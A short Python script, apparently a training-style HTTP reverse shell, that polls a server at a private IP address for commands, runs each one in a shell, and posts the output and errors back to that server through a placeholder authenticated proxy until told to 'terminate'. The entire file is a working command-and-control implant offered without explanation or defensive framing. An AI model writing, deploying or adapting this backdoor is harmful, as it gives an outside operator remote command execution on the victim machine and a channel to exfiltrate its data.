import requests
import subprocess
import time

url = "http://172.26.44.222"

while True:
    req = requests.get(url)
    command = req.text

    if 'terminate' in command:
        break

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url=url,  proxies={'http': "http://usrname:password@proxyserverIP:port"}, data=CMD.stdout.read())
        post_response = requests.post(url=url, proxies={'http': "http://usrname:password@proxyserverIP:port"}, data=CMD.stderr.read())

    time.sleep(3)